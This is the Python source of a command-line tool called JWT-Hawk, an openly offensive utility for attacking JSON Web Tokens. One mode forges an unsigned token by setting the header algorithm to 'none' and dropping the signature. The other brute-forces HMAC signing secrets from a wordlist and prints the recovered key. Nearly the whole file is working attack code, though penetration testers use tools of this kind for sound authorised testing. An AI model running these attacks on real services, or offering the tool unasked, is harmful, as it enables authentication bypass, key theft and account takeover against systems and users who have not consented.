import jwt
import sys
import colorama
from colorama import Fore
from rich.console import Console
from rich.text import Text
import base64
import json

# Initialize colorama
colorama.init(autoreset=True)

# Create a Console instance for rich
console = Console()

def print_banner():
    """Prints the banner for the JWT-Hawk tool."""
    banner_text = "JWT-Hawk - Decode JWT Tokens"
    banner = Text(banner_text, style="cyan bold underline")  # Added underline for emphasis
    console.print(banner, style="bold cyan on black")  # Print with background for more emphasis
    console.print(Text("A tool for decoding JWT tokens using a list of secrets.", style="yellow"))
    console.print(Text("Version 2.0", style="magenta"))
    console.print(Text("RedHawks Cyber Research Tool by DL28", style="white"))
    print("\n")

def handle_none(jwt_token):
    """Handles the 'none' functionality for JWT processing."""
    header, payload, signature = jwt_token.split('.')
    
    # Decode the header
    header_json = json.loads(base64.urlsafe_b64decode(header + '==').decode('utf-8'))
    
    # Create a new header with only the alg value set to 'none'
    new_header_json = {
        'alg': 'none'
    }
    
    # Encode the modified header back to base64
    modified_header = base64.urlsafe_b64encode(json.dumps(new_header_json).encode('utf-8')).decode('utf-8').rstrip("=")
    
    # Return the modified JWT without the signature
    return f"{modified_header}.{payload}."

# Extract and Print the Header Values
def JWTHeaderExtract(jwt_token):
    print("[##] JWT Header Values:\n")
    try:
        jwt_header = jwt.get_unverified_header(jwt_token)
    except jwt.InvalidTokenError as err:
        print(Fore.RED + f"Failed to read JWT header: {err}")
        return None
    for Hkey, Hvalue in jwt_header.items():
        print(Fore.GREEN + f"{Hkey} ---- {Hvalue}")
    return jwt_header

DECODE_OPTIONS = {
    "verify_signature": True,
    "verify_exp": False,
    "verify_nbf": False,
    "verify_iat": False,
}

# Extract and Print the Payload Values, if the Secret matches
def JWTPayloadwithSecret(jwt_token, secretsList, algorithms):
    for secret in secretsList:
        try:
            decoded_payload = jwt.decode(
                jwt_token,
                secret,
                algorithms=algorithms,
                options=DECODE_OPTIONS,
            )
            print("\n[##] JWT Payload Values:\n")
            for key, value in decoded_payload.items():
                print(Fore.GREEN + f"{key} ---- {value}")
            print("\n[##] JWT Decoded Signature:\n")
            print(Fore.RED + f"{secret}")
            return secret  # Return the successful secret
        except jwt.InvalidTokenError:
            continue  # Continue if the token is invalid


def print_help():
    """Prints the help information for using the JWT-Hawk tool."""
    help_text = """
    JWT-Hawk - Decode JWT Tokens

    Usage:
        python3 jwt-hawk.py <mode> [options]

    Modes:
        none    - Process a JWT token with 'alg' set to 'none'.
        brute   - Attempt to brute-force decode a JWT token using a list of secrets.

    Options for 'brute':
        <secrets_file> - Path to the file containing a list of secrets to try.
        --token <jwt>  - Optional JWT token value; skips the interactive prompt.

    Example:
        python3 jwt-hawk.py none
        python3 jwt-hawk.py brute sample-secrets.txt --token <jwt>

    Note:
        Make sure to provide a valid JWT token when using the 'none' mode or supplying --token.
    """
    print(help_text)

# Prompt user for JWT token input and file name of secret list        
def main():
    print_banner()  # Call the banner function at the start of main
    try:
        if len(sys.argv) < 2:
            print(Fore.RED + "Please provide an argument: 'none', 'brute', or 'help'.")
            return
        
        mode = sys.argv[1].lower()  # Normalize input to lowercase
        
        if mode == "help":
            print_help()
            return
        
        if mode == "none":
            jwt_token = input("JWT Token: ")
            if not jwt_token:
                print(Fore.RED + "JWT Token cannot be empty.")
                return
            
            modified_jwt = handle_none(jwt_token)
            print(Fore.YELLOW + f"Modified JWT (alg set to 'none'): {modified_jwt}")
        
        elif mode == "brute":
            file_name = None
            jwt_token_arg = None
            extra_args = sys.argv[2:]

            idx = 0
            while idx < len(extra_args):
                arg = extra_args[idx]
                if arg == "--token":
                    if idx + 1 >= len(extra_args):
                        print(Fore.RED + "Missing value for --token.")
                        return
                    jwt_token_arg = extra_args[idx + 1]
                    idx += 2
                elif arg.startswith("--token="):
                    jwt_token_arg = arg.split("=", 1)[1]
                    idx += 1
                elif arg.startswith("--"):
                    print(Fore.YELLOW + f"Ignoring unrecognized option: {arg}")
                    idx += 1
                elif file_name is None:
                    file_name = arg
                    idx += 1
                else:
                    print(Fore.YELLOW + f"Ignoring extra positional argument: {arg}")
                    idx += 1

            if not file_name:
                print(Fore.RED + "Please provide the sample text file for brute force.")
                return

            with open(file_name) as secretFile:
                secretsList = [line.strip() for line in secretFile if line.strip()]

            if not secretsList:
                print(Fore.RED + "The secrets file is empty or contains only blank lines.")
                return

            print(f"Total Secrets to be attempted: {len(secretsList)}\n") 
            
            # Prompt for JWT token for brute force decoding
            jwt_token = jwt_token_arg or input("JWT Token for brute force: ")
            if jwt_token:
                jwt_header = JWTHeaderExtract(jwt_token=jwt_token)
                if not jwt_header:
                    return

                header_alg = jwt_header.get("alg")
                if isinstance(header_alg, str):
                    algorithms = [header_alg]
                elif isinstance(header_alg, (list, tuple)):
                    algorithms = list(header_alg)
                else:
                    algorithms = []

                hmac_algorithms = [alg for alg in algorithms if isinstance(alg, str) and alg.startswith("HS")]
                if not hmac_algorithms:
                    if not algorithms:
                        hmac_algorithms = ["HS256", "HS384", "HS512"]
                    else:
                        print(Fore.RED + "The JWT header algorithm is not an HMAC variant; brute force with shared secrets is unsupported.")
                        return

                successful_secret = JWTPayloadwithSecret(
                    jwt_token=jwt_token,
                    secretsList=secretsList,
                    algorithms=hmac_algorithms,
                )
                if successful_secret:
                    print(f"[##] Successfully decoded with secret: {successful_secret}")
                else:
                    print(Fore.RED + "Sorry, Did not find any Secret to Decode.")
            else:
                print(Fore.YELLOW + "No JWT token provided for brute force decoding.")
        
        else:
            print(Fore.RED + "Invalid argument. Use 'none', 'brute', or 'help'.")

    except IndexError:
        print(Fore.RED + "Please provide the secret file name as an argument.")
    except Exception as e:
        print(Fore.RED + f"An error occurred: {str(e)}")

if __name__ == "__main__":
    main()
